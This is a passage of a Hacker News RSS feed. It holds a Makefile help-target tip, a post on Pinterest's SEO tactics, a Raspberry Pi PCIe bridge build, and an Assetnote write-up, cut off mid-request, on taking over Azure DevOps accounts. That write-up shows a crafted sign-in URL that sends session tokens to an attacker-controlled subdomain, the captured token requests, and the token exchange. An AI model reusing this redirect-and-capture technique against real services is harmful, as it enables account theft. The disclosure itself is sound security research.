</code></pre></div></div> <p>Then, we will use the <code>grep</code> and <code>sed</code> command to get the name of the target and the documentation, like in the following snippet:</p> <div><div><pre><code>.DEFAULT_GOAL :<span>=</span> <span>help</span>
.PHONY: <span>help

help</span>:
	@grep <span>-E</span> <span>'^[a-zA-Z0-9_-]+:.*?## .*$$'</span> <span>$(</span>MAKEFILE_LIST<span>)</span> <span>\</span>
	| <span>sed</span> <span>-n</span> <span>'s/^\(.*\): \(.*\)##\(.*\)/\1\3/p'</span> <span>\</span>
	| column <span>-t</span>  <span>-s</span> <span>' '</span>
</code></pre></div></div> <p>We will also set the <code>.PHONY</code> and the <code>.DEFAULT_GOAL</code> variables. The last one will make <code>help</code> the default target when running <code>make</code> without a specific target.</p> <p>Now, if we head back to the Terminal app, and run <code>make</code>, we will get the list of the documented targets as an output <img title=":rocket:" alt=":rocket:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png" height="20" width="20"></p>
<pre><code>install  Install
run      Run
</code></pre>
</div></div>]]>
            </description>
            <link>https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702756</guid>
            <pubDate>Wed, 01 Jul 2020 15:46:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deconstructing Pinterest’s reverse-image-search SEO growth hack]]>
            </title>
            <description>
<![CDATA[
Score 198 | Comments 103 (<a href="https://news.ycombinator.com/item?id=23701998">thread link</a>) | @jenny8lee
<br/>
July 1, 2020 | https://www.rankscience.com/blog/pinterest-image-seo-growth-hack | <a href="https://web.archive.org/web/*/https://www.rankscience.com/blog/pinterest-image-seo-growth-hack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <div id="post-418">
		<div>	
		<p><img src="https://pbs.twimg.com/profile_images/1178728529187495937/xbH7cGaT_400x400.jpg" alt="Ryan Bednar" width="55" height="55"></p>
<p>By <strong><a href="https://twitter.com/ryanbed">Ryan Bednar</a></strong> (CEO of <a href="https://www.rankscience.com/">RankScience</a>)</p>
<blockquote><p><span>Update</span>: This post got a ton of traffic on Hacker News today and&nbsp;Pinterest reached out to comment: “The claim that we scrape Google search results is false. We do not, and never have, scraped Google search results at any time.” The original article suggested Pinterest scrapes Google directly, but instead it seems more likely that Pinterest grabs data from Google through it’s Chrome Extension. We’ll update this post as we learn more from them.</p></blockquote>
<p>A few weeks ago in the Twitterverse, @SwiftOnSecurity <a href="https://twitter.com/SwiftOnSecurity/status/1258875333446717445" target="_blank" rel="noopener noreferrer">outed Pinterest</a> for using a somewhat surprising SEO tactic: for every image uploaded to Pinterest that doesn’t have any real metadata or description of the picture, Pinterest automatically performs a reverse image search on Google, scrapes all of the metadata and descriptions they can find for that image, and then uploads that content onto their site and pretends it’s from their own users.</p>
<p>This is interesting for a couple of reasons:</p>
<ul>
<li dir="ltr" role="presentation"><span>Google typically does not react kindly to anyone trying to scrape its results </span><i><span>for any reason</span></i><span>, so this is incredibly difficult to do at scale (across hundreds of millions of photos) without being blocked.</span></li>
<li dir="ltr" role="presentation"><span>Often when somewhat shady SEO tactics are exposed on Twitter, Google responds by issuing a manual action and penalizing the offending site in search results. This famously happened to </span><a href="https://marketingland.com/10-big-brands-that-were-penalized-by-google-69646"><span>Genius years ago as they were put in time-out</span></a><span> and told to re-evaluate their blackhat SEO strategy. </span></li>
<li dir="ltr" role="presentation"><span>Pinterest is a publicly traded company, so if they’re penalized it could hurt the company’s stock price ($PINS).</span></li>
</ul>
<p><i><span>Content relevance</span></i><span>&nbsp;is a ranking factor in Google. The closer semantically you can describe a topic or image to how Google understands it, the better your chances of ranking higher in their index. Will Google find this behavior flagrantly blackhat and respond accordingly? </span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM.png" alt="" width="546" height="293" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM.png 1208w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-300x161.png 300w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-1024x549.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-768x412.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-600x322.png 600w" sizes="(max-width: 546px) 100vw, 546px"></p>

<h2><strong>Some background on Pinterest SEO</strong></h2>
<p><span>Pinterest has been super successful with SEO growth over the years. Their post on </span><a href="https://medium.com/pinterest-engineering/demystifying-seo-with-experiments-a183b325cf4c"><span>Demystifying SEO with Experiments</span></a><span> was particularly inspirational for me in deciding to start </span><a href="https://www.rankscience.com/"><span>RankScience</span></a><span>, an SEO automation and A/B testing company. So any time I hear about programmatic SEO tactics that work on a site as large as Pinterest, with 800M+ pages indexed in Google, I’m intrigued. This is obviously a strategy they would never talk about doing publicly, so it’s fascinating to see it exposed and called out like this.</span></p>
<h2><strong>So how exactly does this Pinterest SEO growth hack work?</strong></h2>
<ul>
<li><span>User uploads a photo to Pinterest without any meta data.</span></li>
<li><span>Pinterest performs a reverse image search on Google for that image.</span></li>
<li><span>Pinterest scrapes all the text captions for related photos that appear from Google.</span></li>
<li><span>Pinterest publishes these text captions under </span><b>What others are saying</b><span> on their own page.</span></li>
<li></li>
</ul>

<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png" alt="Pinterest SEO growth hack" width="504" height="652" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png 940w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-232x300.png 232w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-792x1024.png 792w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-768x993.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-600x776.png 600w" sizes="(max-width: 504px) 100vw, 504px"></p>

<p><span>Voila! Instant unique and scalable SEO text content that maps directly to Google’s understanding of the photo.&nbsp;</span><span>Google indexes the Pinterest page with the new text content and ranks it higher because of the strong relevance of the text on the page to its existing understanding of the photo.&nbsp;</span><span>Rinse and repeat across millions of photos.</span></p>
<h2><strong>The SEO community took notice:</strong></h2>
<h2><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png" alt="Pinterest SEO growth hack community reaction" width="478" height="191" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png 300w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-1024x410.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-768x307.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-600x240.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM.png 1334w" sizes="(max-width: 478px) 100vw, 478px"></h2>
<h2><strong>And what was Google’s response?</strong></h2>
<p><span>John Mu, Webmaster Trends Analyst at Google, and part of the webspam team responsible for policing SEO behavior, chimed in on the thread and offered support for the content available on Pinterest. He didn’t comment directly on this behavior, but I’d bet that the popularity of this thread alerted some people at Google and that there’s an investigation going on internally into this practice at Pinterest. ($PINS) The only reason that Google would let this slide is that they don’t view policing Image Search as high priority.</span></p>
<h2><b>How you can take advantage of Content Relevance to rank higher in Google</b></h2>
<p><span>Content relevance is an important ranking factor in Google search. It’s widely accepted that Google calculates relevance for individual URLs and pieces of content as they relate to a particular query or keyword, and that these quantitative relevance calculations play a role in its ranking algorithms. In the Pinterest example, they’re taking an image that Google already knows about and grabbing multiple text descriptions of that image from Google itself, then combining them in one place to provide one comprehensive page describing the image. This maps exactly to Google’s existing understanding of that image, so the page then likely achieves a very high content relevance score.</span></p>
<p><span>One way you can apply what Pinterest is doing to improve the rankings of content on your own site is to use a NLP method called </span><a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"><span>TF-IDF</span></a><span> (term frequency-inverse document frequency). This is a text analysis technique that helps reveal how important a word or phrase is to a document in a corpus (example: a collection of URLs). You can either break out a spreadsheet and do this by hand, or use an advanced content optimization tool like <a href="https://www.rankscience.com/seo-content-insights">RS Content Insights</a> to do this analysis at scale.&nbsp; </span></p>
<p><span>Let’s say that you wanted to rank in Google for </span><i><span>google image search seo</span></i><span>. We already know which documents Google thinks are the most relevant and highest authority for this search term because those are the pages that show up in search results. So we can start by downloading the top 25 URLs ranking in Google for </span><i><span>google image search seo</span></i><span> and performing tf–idf analysis across all of those documents to reveal key topic entities that are semantically related to the search term.</span></p>
<p><span>Here are the topic entities produced by TF-IDF when we ran this post that you’re reading right now through Content Insights for </span><i><span>google image search seo</span></i><span>.</span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png" alt="google image search seo" width="640" height="693" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png 946w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-277x300.png 277w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-768x831.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-600x649.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM.png 1388w" sizes="(max-width: 640px) 100vw, 640px"></p>
<p><span>You’ll see that TF-IDF analysis suggests using keywords like alt tags, alt text, image quality, file size, and stock photos, which are all associated with </span><i><span>google image search seo</span></i><span>, even though they are not replacements or alternatives to the keyword. This gets directly at Google’s understanding of the topic and using this method you can get your content ranking your post higher for having a better content relevance score — it’s often surprisingly effective. In addition to </span><a href="https://www.rankscience.com/coderwall-seo-split-test"><span>SEO A/B testing</span></a><span>, which everyone should be doing by now, using NLP and TF-IDF to refresh and update existing long-form content on your site is an incredibly effective way to grow search traffic and rankings in 2020, and an important tool in any marketing team’s tool kit.</span></p>
<h3>Related Posts</h3>
<ul>
<li><a href="https://www.rankscience.com/coderwall-seo-split-test">How Coderwall grew SEO traffic by 57% with a single SEO A/B test</a></li>
<li><a href="https://www.rankscience.com/blog/how-businesses-boost-sales-with-seo-a-b-testing-on-ecommerce-sites">How eCommerce sites are using SEO A/B testing to boost sales</a></li>
</ul>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo.png" alt="" width="157" height="157" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo.png 157w, https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo-150x150.png 150w" sizes="(max-width: 157px) 100vw, 157px"></p>
<p>Get Data-Driven about growing your traffic with <a href="https://www.rankscience.com/">RankScience</a>.</p>

		
	</div>

	</div>
    
                </div></div>]]>
            </description>
            <link>https://www.rankscience.com/blog/pinterest-image-seo-growth-hack</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701998</guid>
            <pubDate>Wed, 01 Jul 2020 14:52:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi 4 PCIe bridge “chip”]]>
            </title>
            <description>
<![CDATA[
Score 224 | Comments 154 (<a href="https://news.ycombinator.com/item?id=23701208">thread link</a>) | @fanf2
<br/>
July 1, 2020 | https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/ | <a href="https://web.archive.org/web/*/https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>After seeing the work done by <a rel="noreferrer noopener" href="http://mloduchowski.com/en/blog/raspberry-pi-4-b-pci-express/" target="_blank">Thomasz Mloduchowski</a> and <a rel="noreferrer noopener" href="http://labs.domipheus.com/blog/raspberry-pi-4-pci-express-it-actually-works-usb-sata-gpu/" target="_blank">Colin Riley</a> with managing to bridge the Raspberry Pi 4’s PCI-Express bus to a USB 3.0 port, and then seeing <a rel="noreferrer noopener" href="https://hackaday.com/2019/09/05/pcie-multiplier-expands-raspberry-pi-4-possibilities/#comment-6177569" target="_blank">these comments on hack-a-day</a>, I thought I would give it a go too!</p> <p>So, here’s a PCIe bridge “chip” that simply replaces the VL805 USB 3.0 controller chip on the Pi, giving access to the PCI-Express bus on a USB 3.0 port. <s>However, this does mean losing all USB functionality of the Pi. That could be a bit of a problem if you ever mess up the networking and need to attach a keyboard.</s> Never mind, it seems that the USB-C power connector <a rel="noreferrer noopener" href="https://www.raspberrypi.org/forums/viewtopic.php?f=29&amp;t=246348&amp;p=1678554" target="_blank">can run as a USB host</a>, allowing a keyboard to be connected if 5V power is supplied through the GPIO header instead.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg" alt="" width="848" height="375" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-300x133.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-768x341.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1536x681.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg 1761w" sizes="(max-width: 848px) 100vw, 848px"></a></figure></div> <p>The bridge “chip” is a 0.8mm thick PCB from OSHPark with copper pads in the same locations as a real VL805 QFN68 IC package, then traces connecting the PCIe pads to the USB pads that connect to the upper USB 3.0 port. RESET, WAKE and a few other signals were also connected to the lower USB 3.0 port.</p> <figure><table><thead><tr><th>PCIe Signal</th><th>Direction</th><th>USB Signal</th></tr></thead><tbody><tr><td>REFCLK+</td><td>Host -&gt; Device</td><td>D-</td></tr><tr><td>REFCLK-</td><td>Host -&gt; Device</td><td>D+</td></tr><tr><td>HSO+</td><td>Host (TX) -&gt; Device (RX)</td><td>RX-</td></tr><tr><td>HSO-</td><td>Host (TX) -&gt; Device (RX)</td><td>RX+</td></tr><tr><td>HSI+</td><td>Device (TX) -&gt; Host (RX)</td><td>TX-</td></tr><tr><td>HSI-</td><td>Device (TX) -&gt; Host (RX)</td><td>TX+</td></tr><tr><td>RESET</td><td>Host -&gt; Device</td><td>D- (lower port)</td></tr><tr><td>WAKE (not connected anywhere)</td><td>Device -&gt; Host</td><td>D+ (lower port)</td></tr><tr><td>CLKREQ</td><td>Host -&gt; Device</td><td>RX+ (lower port)</td></tr><tr><td>PONRST</td><td>Not a PCIe signal, connected like a reset pin on a microcontroller.</td><td>RX- (lower port)</td></tr></tbody></table><figcaption>HSI and HSO (in and out) are from the perspective of the host controller. Where host HSO/TX will connect to device RX and host HSI/RX to device TX. Man, this is really confusing with TX, RX, device, host, passing through USB, which side is which… 😕</figcaption></figure> <p>There’s also a small hole near the centre, this allows any leftover solder from the large ground pad to have somewhere to go when placing the chip, otherwise the solder could end up squashed out around the edge, shorting out the pads. The PCB is slightly larger than the QFN68 package, as there is a limit on how close the copper can be to the edge. The fabricated PCB should be sanded down to the correct size, so that the cross-section of the copper pads can be seen at the edge of the PCB, just like on a QFN package.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg 1760w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <center></center> <p>After replacing the VL805 with the bridge chip I tried a few PCIe cards that were laying around, the first was a Realtek RTL8168 based ethernet adapter… it didn’t work. Then I tried an ASMedia ASM1083 PCIe to PCI converter, that didn’t work either. I looked over all solder joints, checked for continuity, shorts, and everything seemed fine. I tried all kinds of things, like removing the capacitors and swapping the + and – of each signal in case they were swapped at the device end, as this is a feature of PCIe called <a rel="noreferrer noopener" href="https://teledynelecroy.com/doc/understanding-lane-reversal-and-polarity" target="_blank">polarity inversion</a> that maybe the controller did not support. The Pi just would not detect them. It seemed to be unable to train the PCIe link as <code>dmesg</code> showed <code>link down</code> instead of <code>link up, 2.5 Gbps x1 (!SSC)</code>. In the end I ordered a USB 3.0 expansion card containing a VL805, the same as the Pi. When it eventually arrived, I plugged it in and it was detected first time! I found a Realtek RTL8111 based ethernet adapter, and that worked too! After installing the driver for the RTL8111 it was able to obtain an IP from the DHCP server and I could ping the interface.</p> <div><figure><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png 628w, https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4-300x30.png 300w" sizes="(max-width: 628px) 100vw, 628px"></figure></div> <p>I wonder what it is about the RTL8168 and ASM1083 that makes them incompatible with the Raspberry Pi? Maybe they just don’t like the PCIe signals running through a load of USB connectors and cables.<br><strong>UPDATE 1:</strong> Using an ASM1184e PCIe switch and these two expansion cards are still not detected, so probably not signal issues. The device trees file has been modified to allow more than one PCIe device, as described in Colins blog post. Other cards work in the switch, just not these two.<br><strong>UDPATE 2:</strong> Nevermind, the problem with the ASM1083 was that I hadn’t connected the 5V rail, and is now detected by the Pi. RTL8168 still doesn’t work for some reason.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <p>A quick test using 4 USB 3.0 flash drives plugged into the VL805 expansion card resulted with a total read throughput of 3 Gbps out of a maximum theoretical throughput of 4 Gbps over a 5 Gbps PCIe 2.0 link. The flash drives had their read speeds almost maxed out, probably slowed down slightly from overhead of having to switch between each drive while reading.<br><strong>UPDATE: </strong>Another test with 5 USB flash drives, a USB hub and a USB-to-Ethernet adapter resulted in 3 Gbps again, so this seems like a limitation of the VL805 or CPU. Other RPi4 benchmarks using SSDs through USB 3 also maxed out at 3 Gbps.</p> <p>The RESET and WAKE traces on the riser board should be cut, otherwise RESET will be connected to GND preventing the card from starting and WAKE will be connected to 5V possibly damaging the device if that pin is not 5V tolerant. The RESET line should then have a 10k pullup connected to the 3.3V supply, or connected to the D- signal of the lower USB 3.0 port of the Pi.</p> <p>Colin mentioned that Thomasz also had kernel panic problems with his setup, I had a few panics and freezes too, but they seemed to be caused by wiggling the PCIe card a little too much.</p> <p><a rel="noreferrer noopener" href="https://docs.turris.cz/hw/mox/Turris_Mox_F.pdf" target="_blank">This pdf</a> has a full schematic using a VL805 on pages 7 and 8 (pictured below), very handy since any information about the chip is scarce.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8.png" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8-150x150.png" alt=""></a></figure></div> <p>These “chips” are available to buy from my <a href="https://www.tindie.com/products/20478/" target="_blank" rel="noreferrer noopener">Tindie store</a>! Or they can be ordered directly from me, send an email to shop@zakkemble.net</p> <div><figure><a href="https://www.tindie.com/products/20478/" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/02/tindie_robodog.png" alt=""></a></figure></div> <p><strong>PCB designs and things are on <a rel="noreferrer noopener" href="https://github.com/zkemble/RPi4-PCIe-Bridge" target="_blank">GitHub</a></strong></p> </div></div>]]>
            </description>
            <link>https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701208</guid>
            <pubDate>Wed, 01 Jul 2020 13:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Taking over Azure DevOps accounts with one click]]>
            </title>
            <description>
<![CDATA[
Score 90 | Comments 17 (<a href="https://news.ycombinator.com/item?id=23700800">thread link</a>) | @infosecau
<br/>
July 1, 2020 | https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/ | <a href="https://web.archive.org/web/*/https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>When performing subdomain takeovers, you should be asking yourself, what is the impact, and how do I prove it? This was especially the case when taking over the subdomain <code>project-cascade.visualstudio.com</code>.</p>

<p>At first glance, it didn’t seem like we could do much by taking this subdomain over as nothing super sensitive lived under <code>*.visualstudio.com</code>. However, under deeper examination, we were able to exploit a trust boundary, leading to a 1 click account takeover of Azure DevOps accounts.</p>

<h2 id="technical-details">Technical Details</h2>

<p>Through automation, we found the subdomain <code>project-cascade.visualstudio.com</code>, which was vulnerable to an Azure Zone DNS takeover.</p>

<p>The NS records for <code>project-cascade.visualstudio.com</code> were pointing to Azure DNS, however they were no longer registered on Azure DNS. This resulted in the lookups being refused, as shown below:</p>

<pre><code>dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns3-05.azure-dns.org status: [Refused]           
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns2-05.azure-dns.net status: [Refused]
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns1-05.azure-dns.com status: [Refused]          
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns4-05.azure-dns.info status: [Refused]
</code></pre>

<p>As the lookups were being refused, we were able to to register the subdomain under an Azure account that we owned. By doing so, we were able to create arbitrary DNS records for the subdomain <code>project-cascade.visualstudio.com</code>:
<br></p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-0.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Azure Console with <code>project-cascade.visualstudio.com</code> registered as a DNS Zone</em></td>
    </tr>
  </tbody>
</table>

<p><br>
From this point on wards, we registered two records:</p>

<ul>
  <li>TXT Record - <code>txt.project-cascade.visualstudio.com</code> with the value of <code>Azure DNS Zone Takeover POC</code> (proof of concept)</li>
  <li>A Record - <code>arec.project-cascade.visualstudio.com</code> with the value of <code>3.88.203.203</code> (our host)</li>
</ul>

<pre><code>$ dig txt txt.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
txt.project-cascade.visualstudio.com. 10 IN TXT "Azure DNS Zone Takeover POC"

$ dig a arec.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
arec.project-cascade.visualstudio.com. 2475 IN A 3.88.203.203

</code></pre>

<h2 id="so-whats-next">So, what’s next?</h2>

<p>Now that we had successfully taken the subdomain over, it was time to investigate the security impact.</p>

<p>We discovered that there were subdomains underneath <code>visualstudio.com</code> that facilitated an authentication flow through <code>login.microsoftonline.com</code>.</p>

<p>For example, when visiting  <code>app.vssps.visualstudio.com</code>, we were redirected to:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90#ctx=eyJTaWduSW5Db29raWVEb21haW5zIjpbImh0dHBzOi8vbG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSJdfQ2
</code></pre>

<p>Which then redirected to:</p>

<pre><code>https://login.microsoftonline.com/...omitted...
</code></pre>

<p>The most important thing to note from the URLs above, is the following parameter and value for the endpoint <code>https://app.vssps.visualstudio.com/_signin</code>:</p>

<p><code>reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F</code></p>

<p>Through some testing, we determined that this authentication flow had a loosely configured <code>reply_to</code> address, allowing any domain under <code>*.visualstudio.com</code> to recieve the authentication tokens.</p>

<p>In order to demonstrate this account takeover flow, we crafted the following URL:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>In the URL above, note that we changed the value of the <code>reply_to</code> parameter to contain the following: <code>https%3A%2F%2Farec.project-cascade.visualstudio.com%2F</code> (our subdomain takeover).</p>

<p>This will prompt the user to login via the normal microsoft live.com auth flow, or if the user is already logged in, proceed with the signin and redirect request.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-login.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Visual Studio Authentication Flow via <code>login.microsoftonline.com</code></em></td>
    </tr>
  </tbody>
</table>



<p>Once logged in, this resulted in the following request being made which ultimately resulted in a POST request to our controlled domain <code>arec.project-cascade.visualstudio.com</code>.</p>

<pre><code>POST /_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
Host: arec.vssps.visualstudio.com
Cookie: ...omitted for brevity...

id_token=&lt;snip&gt;&amp;FedAuth=&lt;snip&gt;&amp;FedAuth1=&lt;snip&gt;%2B
</code></pre>

<p>Our controlled domain received the following request which contains authentication tokens for <code>app.vsaex.visualstudio.com</code></p>

<pre><code>POST /_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
Host: arec.project-cascade.visualstudio.com
Content-Length: 4634
Referer: https://arec.vssps.visualstudio.com/_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F
Cookie: ...omitted for brevity...

id_token=&lt;snip&gt;&amp;FedAuth=&lt;snip&gt;&amp;FedAuth1=&lt;snip&gt;
</code></pre>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-1.5.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Final Authentication Token received by arec.project-cascade.visualstudio.com (controlled by us)</em></td>
    </tr>
  </tbody>
</table>



<h2 id="what-can-this-token-be-used-for">What can this token be used for?</h2>

<p>We found that we could exchange the stolen authentication token for a Bearer token through <code>app.vsaex.visualstudio.com</code>. This Bearer token could then be used to authenticate to <code>vsaex.visualstudio.com</code>, <code>dev.azure.com</code> and <code>vssps.dev.azure.com</code>.</p>

<pre><code>POST /_apis/WebPlatformAuth/SessionToken HTTP/1.1
Host: app.vsaex.visualstudio.com
Connection: close
Content-Length: 105
Origin: https://app.vsaex.visualstudio.com
X-VSS-ReauthenticationAction: Suppress
Content-Type: application/json
